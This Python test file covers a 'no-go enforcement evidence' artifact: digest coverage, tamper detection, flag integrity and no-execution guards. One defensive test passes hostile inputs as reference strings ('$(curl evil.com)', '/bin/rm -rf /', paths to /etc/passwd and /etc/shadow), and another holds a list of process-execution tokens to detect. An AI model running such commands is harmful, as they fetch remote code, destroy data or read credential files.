"""Tests for Phase 100D — Execution Boundary No-Go Artifact Trust Hardening.

Test-only. Hardens artifact trust, tamper detection, digest verification,
reference safety, no-go condition integrity, auth/safety flag integrity,
and no-execution guarantees for NoGoEnforcementEvidence.

No source changes. No enforcement. No execution.
"""

from __future__ import annotations
import json as _json
import pytest
from pcae.core.backend_invocations import (
    NoGoEnforcementEvidence,
    VALID_NGE_CATEGORIES, VALID_NGE_SEVERITIES,
    VALID_NGE_STATUSES, VALID_NGE_DECISIONS, VALID_NGE_CONDITIONS,
    NGE_STATUS_DENIED, NGE_STATUS_BLOCKED,
    NGE_DECISION_BLOCKED, NGE_DECISION_DENY,
    NGE_BYPASS_PERMISSIONS, NGE_ARTIFACT_TAMPERED,
    NGE_AUTH_FLAG_TRUE, NGE_NO_EXECUTION_FALSE,
)

_12_AUTH = ["execution_available","execution_authorized","backend_invocation_authorized",
    "adapter_execution_authorized","network_authorized","subprocess_authorized",
    "shell_authorized","mutation_authorized","apply_authorized","rollback_authorized",
    "commit_authorized","push_authorized"]
_5_SAFETY = ["simulation_only","no_execution","evidence_only","non_authorizing","design_only"]

def _dg(**kw): return NoGoEnforcementEvidence(**kw).compute_digest()

# ── 1. Digest determinism and coverage ──

class TestDigestDeterminism:
    def test_sha256_hex_64(self):
        d = NoGoEnforcementEvidence().compute_digest()
        assert len(d) == 64
        assert all(c in "0123456789abcdef" for c in d)
    def test_deterministic(self):
        for _ in range(10):
            assert _dg(evaluation_status=NGE_STATUS_DENIED, triggered_no_go_conditions=[NGE_BYPASS_PERMISSIONS]) == _dg(evaluation_status=NGE_STATUS_DENIED, triggered_no_go_conditions=[NGE_BYPASS_PERMISSIONS])
    def test_excludes_digest_itself(self):
        a = NoGoEnforcementEvidence(); d1 = a.compute_digest(); a.digest = "f"*64; assert a.compute_digest() == d1
    # Identity fields
    def test_schema_version(self): assert _dg(schema_version="1.0") != _dg(schema_version="2.0")
    def test_no_go_evaluation_id(self): assert _dg() != _dg(no_go_evaluation_id="eval-1")
    def test_phase_id(self): assert _dg(phase_id="100B") != _dg(phase_id="100C")
    def test_task_id(self): assert _dg() != _dg(task_id="task-1")
    def test_generated_at_utc(self): assert _dg() != _dg(generated_at_utc="2026-01-01")
    # Status/decision
    def test_evaluation_status(self): assert _dg(evaluation_status=NGE_STATUS_DENIED) != _dg(evaluation_status=NGE_STATUS_BLOCKED)
    def test_evaluation_decision(self): assert _dg(evaluation_decision=NGE_DECISION_BLOCKED) != _dg(evaluation_decision=NGE_DECISION_DENY)
    # List fields
    def test_checked_conditions(self): assert _dg() != _dg(checked_no_go_conditions=[NGE_BYPASS_PERMISSIONS])
    def test_triggered_conditions(self): assert _dg() != _dg(triggered_no_go_conditions=[NGE_BYPASS_PERMISSIONS])
    def test_missing_evidence(self): assert _dg() != _dg(missing_evidence=["p97"])
    def test_failed_checks(self): assert _dg() != _dg(failed_checks=["digest_mismatch"])
    def test_denial_reasons(self): assert _dg() != _dg(denial_reasons=["denied_bypass"])
    def test_unknown_conditions(self): assert _dg() != _dg(unknown_conditions=["FUTURE_COND"])
    def test_unsupported_requests(self): assert _dg() != _dg(unsupported_requests=["telegram_inbound"])
    def test_warnings(self): assert _dg() != _dg(warnings=["test_warning"])
    # Safety flags
    def test_simulation_only(self): assert _dg(simulation_only=True) != _dg(simulation_only=False)
    def test_no_execution(self): assert _dg(no_execution=True) != _dg(no_execution=False)
    def test_evidence_only(self): assert _dg(evidence_only=True) != _dg(evidence_only=False)
    def test_non_authorizing(self): assert _dg(non_authorizing=True) != _dg(non_authorizing=False)
    def test_design_only(self): assert _dg(design_only=True) != _dg(design_only=False)
    # Honest gaps: excluded fields
    def test_source_refs_not_in_digest(self):
        b = _dg()
        assert _dg(source_gap_analysis_ref="ref") == b
        assert _dg(phase97_preflight_ref="ref") == b
        assert _dg(phase98_preflight_ref="ref") == b
        assert _dg(phase99_attempt_boundary_ref="ref") == b
        assert _dg(override_attempts=["override"]) == b
    def test_auth_flags_not_in_digest(self):
        b = _dg()
        for f in _12_AUTH:
            assert _dg(**{f: True}) == b

# ── 2. Tamper detection ──

class TestTamperDetection:
    def _tamper(self, **kw):
        a = NoGoEnforcementEvidence(); a.digest = a.compute_digest(); s = a.digest
        for f,v in kw.items(): setattr(a, f, v)
        assert a.compute_digest() != s
    def test_schema_version(self): self._tamper(schema_version="99.0")
    def test_no_go_evaluation_id(self): self._tamper(no_go_evaluation_id="tampered")
    def test_phase_id(self): self._tamper(phase_id="99X")
    def test_task_id(self): self._tamper(task_id="tampered")
    def test_generated_at_utc(self): self._tamper(generated_at_utc="2060-01-01")
    def test_evaluation_status(self): self._tamper(evaluation_status=NGE_STATUS_BLOCKED)
    def test_evaluation_decision(self): self._tamper(evaluation_decision=NGE_DECISION_DENY)
    def test_triggered_conditions(self): self._tamper(triggered_no_go_conditions=[NGE_BYPASS_PERMISSIONS])
    def test_checked_conditions(self): self._tamper(checked_no_go_conditions=[NGE_ARTIFACT_TAMPERED])
    def test_missing_evidence(self): self._tamper(missing_evidence=["tampered"])
    def test_failed_checks(self): self._tamper(failed_checks=["tampered"])
    def test_denial_reasons(self): self._tamper(denial_reasons=["tampered"])
    def test_unknown_conditions(self): self._tamper(unknown_conditions=["TAMPERED"])
    def test_unsupported_requests(self): self._tamper(unsupported_requests=["tampered"])
    def test_warnings(self): self._tamper(warnings=["tampered"])
    def test_simulation_only(self): self._tamper(simulation_only=False)
    def test_no_execution(self): self._tamper(no_execution=False)
    def test_evidence_only(self): self._tamper(evidence_only=False)
    def test_non_authorizing(self): self._tamper(non_authorizing=False)
    def test_design_only(self): self._tamper(design_only=False)
    def test_tampered_digest_mismatch(self):
        a = NoGoEnforcementEvidence(evaluation_status=NGE_STATUS_DENIED)
        a.digest = a.compute_digest(); s = a.digest
        a.evaluation_status = NGE_STATUS_BLOCKED; assert a.compute_digest() != s

# ── 3. No-go condition trust ──

class TestConditionTrust:
    def test_all_30_non_authorizing(self):
        for c in sorted(VALID_NGE_CONDITIONS):
            a = NoGoEnforcementEvidence(triggered_no_go_conditions=[c])
            assert a.execution_available is False; assert a.non_authorizing is True
    def test_all_30_digest_covered(self):
        b = _dg()
        for c in sorted(VALID_NGE_CONDITIONS):
            assert _dg(triggered_no_go_conditions=[c]) != b
    def test_triggered_always_deny(self):
        a = NoGoEnforcementEvidence(triggered_no_go_conditions=[NGE_BYPASS_PERMISSIONS])
        assert a.evaluation_status == NGE_STATUS_DENIED
        assert a.execution_available is False
    def test_unknown_fails_clearly(self):
        issues = NoGoEnforcementEvidence(triggered_no_go_conditions=["BOGUS"]).validate()
        assert any("unknown no-go condition" in i for i in issues)

# ── 4. Category / Severity trust ──

class TestCategoryTrust:
    def test_17_recognized(self): assert len(VALID_NGE_CATEGORIES) == 17
    def test_all_lowercase(self):
        for c in VALID_NGE_CATEGORIES: assert c == c.lower()
class TestSeverityTrust:
    def test_6_recognized(self): assert len(VALID_NGE_SEVERITIES) == 6
    def test_all_blocking(self):
        for s in VALID_NGE_SEVERITIES:
            a = NoGoEnforcementEvidence(triggered_no_go_conditions=[NGE_BYPASS_PERMISSIONS])
            assert a.execution_available is False

# ── 5. Status/decision trust ──

class TestStatusDecisionTrust:
    def test_3_statuses(self): assert len(VALID_NGE_STATUSES) == 3
    def test_2_decisions(self): assert len(VALID_NGE_DECISIONS) == 2
    def test_default_denied_blocked(self):
        a = NoGoEnforcementEvidence()
        assert a.evaluation_status == NGE_STATUS_DENIED
        assert a.evaluation_decision == NGE_DECISION_BLOCKED
    def test_unknown_status_fails(self):
        issues = NoGoEnforcementEvidence(evaluation_status="executing").validate()
        assert any("invalid evaluation_status" in i for i in issues)
    def test_unknown_decision_fails(self):
        issues = NoGoEnforcementEvidence(evaluation_decision="approved").validate()
        assert any("invalid evaluation_decision" in i for i in issues)
    def test_no_status_means_executing(self):
        assert "executing" not in VALID_NGE_STATUSES
    def test_no_decision_permits_execution(self):
        assert "allow" not in VALID_NGE_DECISIONS
        assert "execute" not in VALID_NGE_DECISIONS

# ── 6. Auth flag trust ──

class TestAuthFlagTrust:
    def test_all_12_present_and_false(self):
        a = NoGoEnforcementEvidence()
        for f in _12_AUTH:
            assert getattr(a, f) is False
    def test_all_12_in_to_dict(self):
        d = NoGoEnforcementEvidence().to_dict()
        for f in _12_AUTH:
            assert f in d["authorization_summary"]; assert d["authorization_summary"][f] is False
    def test_validate_rejects_unsafe(self):
        for kw in [{"execution_available":True},{"execution_authorized":True},{"push_authorized":True}]:
            assert len(NoGoEnforcementEvidence(**kw).validate()) > 0
    def test_no_text_implies_auth(self):
        j = _json.dumps(NoGoEnforcementEvidence().to_dict()).lower()
        assert "execution is authorized" not in j

# ── 7. Safety flag trust ──

class TestSafetyFlagTrust:
    def test_all_5_true(self):
        a = NoGoEnforcementEvidence()
        for f in _5_SAFETY: assert getattr(a, f) is True
    def test_validate_rejects_false(self):
        for kw in [{"simulation_only":False},{"no_execution":False},{"design_only":False}]:
            assert len(NoGoEnforcementEvidence(**kw).validate()) > 0
    def test_all_5_in_digest(self):
        b = _dg()
        for f in _5_SAFETY: assert _dg(**{f: False}) != b

# ── 8. Reference validation ──

class TestReferenceSafety:
    def test_refs_are_strings_never_executed(self):
        a = NoGoEnforcementEvidence(
            source_gap_analysis_ref="../etc/passwd",
            phase97_preflight_ref="file:///etc/shadow",
            phase98_preflight_ref="$(curl evil.com)",
            phase99_attempt_boundary_ref="/bin/rm -rf /",
        )
        assert a.execution_available is False; assert a.no_execution is True
    def test_refs_not_treated_as_paths(self):
        a = NoGoEnforcementEvidence(phase97_preflight_ref="../../escape")
        assert a.no_execution is True

# ── 9. Verification error contract ──

class TestVerificationContract:
    def test_valid_empty_issues(self):
        assert NoGoEnforcementEvidence().validate() == []
    def test_invalid_schema_structured(self):
        issues = NoGoEnforcementEvidence(schema_version="99.0").validate()
        assert any("unknown schema_version" in i for i in issues)
    def test_multiple_issues_together(self):
        a = NoGoEnforcementEvidence(schema_version="99.0", evaluation_status="executing", execution_available=True)
        assert len(a.validate()) >= 3
    def test_validate_non_mutating(self):
        a = NoGoEnforcementEvidence(); s = a.evaluation_status; a.validate()
        assert a.evaluation_status == s

# ── 10. No-execution guards ──

class TestNoExecutionGuards:
    def test_sources_no_exec(self):
        import inspect
        for m in [NoGoEnforcementEvidence.validate, NoGoEnforcementEvidence.compute_digest, NoGoEnforcementEvidence.to_dict]:
            src = inspect.getsource(m)
            for t in ["subprocess.run(", "os.system(", "Popen(", "spawn("]:
                assert t not in src
    def test_json_no_exec(self):
        j = _json.dumps(NoGoEnforcementEvidence().to_dict()).lower()
        for t in ["subprocess.run","os.system","exec(","shell=true"]:
            assert t not in j
    def test_all_paths_non_executing(self):
        a = NoGoEnforcementEvidence(triggered_no_go_conditions=[NGE_BYPASS_PERMISSIONS])
        a.validate(); a.digest = a.compute_digest(); d = a.to_dict(); _json.dumps(d)
        assert a.execution_available is False; assert a.no_execution is True

# ── 11. 100C contract preservation ──

class Test100CPreservation:
    def test_27_fields(self):
        assert len(NoGoEnforcementEvidence().to_dict()) == 27
    def test_30_conditions(self): assert len(VALID_NGE_CONDITIONS) == 30
    def test_17_categories(self): assert len(VALID_NGE_CATEGORIES) == 17
    def test_6_severities(self): assert len(VALID_NGE_SEVERITIES) == 6
    def test_all_12_auth_false(self):
        a = NoGoEnforcementEvidence()
        for f in _12_AUTH: assert getattr(a, f) is False
    def test_all_5_safety_true(self):
        a = NoGoEnforcementEvidence()
        for f in _5_SAFETY: assert getattr(a, f) is True
    def test_digest_sha256(self):
        assert len(NoGoEnforcementEvidence().compute_digest()) == 64

# ── 12. Phase 99 preservation ──

class TestPhase99Preservation:
    def test_attempt_boundary_intact(self):
        from pcae.core.backend_invocations import GovernedExecutionAttemptBoundary
        a = GovernedExecutionAttemptBoundary()
        assert a.attempt_state == "unavailable"
        assert len(a.to_dict()) == 33
